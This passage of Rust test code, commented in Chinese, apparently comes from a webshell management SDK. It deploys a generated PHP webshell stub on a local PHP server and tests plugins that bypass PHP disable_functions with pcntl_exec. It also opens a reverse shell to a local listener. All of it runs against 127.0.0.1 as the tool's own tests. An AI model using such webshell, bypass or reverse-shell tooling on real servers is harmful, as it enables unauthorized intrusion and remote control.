        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 1) 扫描：确认禁用生效 + 向量评估
            let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            let disabled_list = scan["disable_functions"]
                .as_array()
                .map(|a| a.len())
                .unwrap_or(0);
            assert!(disabled_list >= 8, "禁用清单应生效：{scan:?}");
            assert_eq!(scan["detected"]["exec"].as_bool(), Some(false));
            assert_eq!(
                scan["vectors"]["pcntl"].as_bool(),
                Some(true),
                "pcntl 应可用"
            );
            eprintln!(
                "[bypass] 禁用环境 scan：pcntl={:?} ffi={:?} ld_preload={:?}",
                scan["vectors"]["pcntl"], scan["vectors"]["ffi"], scan["vectors"]["ld_preload"]
            );
            // 2) syscall 向量：全部禁用 → 明确失败
            let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(
                out["ok"].as_bool(),
                Some(false),
                "全禁时 syscall 应失败：{out:?}"
            );
            eprintln!("[bypass] syscall 正确报告全禁");
            // 3) pcntl 向量：应成功执行 id
            let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 应成功：{out:?}");
            assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
            eprintln!("[bypass] pcntl_exec 绕过成功（命令函数全禁）");
            // 4) pcntl 反弹向量：listener 交互验证
            let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
            let _ = std::fs::write(&listener_script, REV_LISTENER);
            let rport: u16 = 25000 + (std::process::id() % 500) as u16;
            let outfile =
                std::env::temp_dir().join(format!("rev_disable_{}.txt", std::process::id()));
            let ready =
                std::env::temp_dir().join(format!("rev_disable_{}.txt.ready", std::process::id()));
            let _ = std::fs::remove_file(&outfile);
            let _ = std::fs::remove_file(&ready);
            let listener = std::process::Command::new("python3")
                .arg(&listener_script)
                .arg(rport.to_string())
                .arg(outfile.to_string_lossy().into_owned())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
            if listener.is_err() {
                eprintln!("跳过 pcntl 反弹向量：未检测到 python3 可执行文件（listener 需要）");
                return Ok(());
            }
            // 轮询就绪标记，替代固定 sleep —— CI runner 负载高时 400ms 内可能尚未 bind
            let mut listener_ready = false;
            for _ in 0..100 {
                if ready.exists() {
                    listener_ready = true;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            if !listener_ready {
                eprintln!("跳过 pcntl 反弹向量：listener 未在 10 秒内就绪");
                return Ok(());
            }
            let out = dosword_sdk::bypass::BypassReversePcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"host": "127.0.0.1", "port": rport, "background": true}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let mut captured = String::new();
            for _ in 0..60 {
                if let Ok(content) = std::fs::read_to_string(&outfile) {
                    captured = content;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
            assert!(
                captured.contains("uid="),
                "pcntl 反弹应收到 id 输出：{captured}"
            );
            eprintln!("[bypass] pcntl 反弹 shell 绕过成功（proc_open 全禁）");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("禁用环境 bypass 真实执行应成功：{error}"));
    }

    // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---

    /// 探测当前 php 的 openssl 是否支持 DES-ECB。
    ///
    /// OpenSSL 3 把 DES 等算法移入 legacy provider，若未加载则
    /// `openssl_encrypt(..., 'DES-ECB', ...)` 直接返回 false。是否受影响取决于
    /// PHP / OpenSSL 的构建与配置（本项目 CI 的 php8.3 实测支持；某些发行版或
    /// 自编译环境不支持）。环境不支持时跳过 native_des 用例并打印原因，
    /// 而不是报一个与代码逻辑无关的假失败。
    fn php_supports_des_ecb() -> bool {
        let probe = "$r = @openssl_encrypt('12345678', 'DES-ECB', '12345678', OPENSSL_RAW_DATA); \
                     echo ($r === false || strlen($r) === 0) ? '0' : '1';";
        std::process::Command::new("php")
            .arg("-r")
            .arg(probe)
            .output()
            .map(|out| String::from_utf8_lossy(&out.stdout).trim() == "1")
            .unwrap_or(false)
    }

    /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
    /// 返回 (endpoint, 临时目录, 进程)。若无 php 可执行则返回 None（跳过测试）。
    /// body 模式编码器（php_stream）自动加 `allow_url_include=1`。
    fn spawn_php_server_with(
        encoder_id: &str,
        password: &str,
        session: bool,
    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
        let stub = if session {
            encoder.stub_session("php", password).ok()?
        } else {
            encoder.stub("php", password).ok()?
        };
        spawn_php_server_stub(&stub, encoder_id, session)
    }

    /// 用**给定的 stub 内容**起 `php -S`（`encoder_id` / `session` 只用于决定启动参数）。
    ///
    /// 供「旧 stub 兼容」类用例使用：需要部署一份**改造过的** stub（例如抹掉能力上报
    /// 字段以模拟旧版本），而 `spawn_php_server_with` 只能部署 SDK 现产出的 stub。
    fn spawn_php_server_stub(
        stub: &str,
        encoder_id: &str,
        session: bool,
    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
        // 缺 php 时测试会静默跳过——CI 上这等于"假绿"。
        // 设置 DOSWORD_REQUIRE_PHP=1 可把跳过变成硬失败（CI 已启用）。
        let require_php = std::env::var("DOSWORD_REQUIRE_PHP").is_ok();
        let php = match std::process::Command::new("php").arg("-v").output() {
            Ok(output) if output.status.success() => output,
            _ => {
                if require_php {
                    panic!(
                        "DOSWORD_REQUIRE_PHP 已设置，但未找到可用的 php 可执行文件：\
                         真实往返测试无法运行（请安装 php-cli 或取消该环境变量）"
                    );
                }
                return None;
            }
        };
        let _ = php;
        let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).ok()?;
        std::fs::write(dir.join("shell.php"), stub).ok()?;
        std::fs::create_dir_all(dir.join("www")).ok()?;
        std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;

        let port = {
            // 取一个空闲端口
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let mut command = std::process::Command::new("php");
        if encoder_id == "php_stream" {
            // 仅 include 流方案需要 allow_url_include；xor_body 用 file_get_contents 无需
            command.arg("-d").arg("allow_url_include=1");
        }
        if session || encoder_id == "xor_session" {
            // 分阶段载荷依赖 session：显式指定可写目录
            command
                .arg("-d")
                .arg(format!("session.save_path={}", dir.display()))
                .arg("-d")
                .arg("session.use_cookies=1");
        }
        let child = command
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::from(
                std::fs::File::create(std::env::temp_dir().join("srv.log")).ok()?,
            ))
            .spawn()
            .ok()?;
        // 等待服务器就绪
        let url = format!("http://127.0.0.1:{port}/shell.php");
        for _ in 0..50 {
            if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Some((url, dir, child))
    }

    #[allow(dead_code)] // 测试基础设施，保留供新增协议用例复用
    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
        spawn_php_server_with("base64", "secret", false)
    }
}
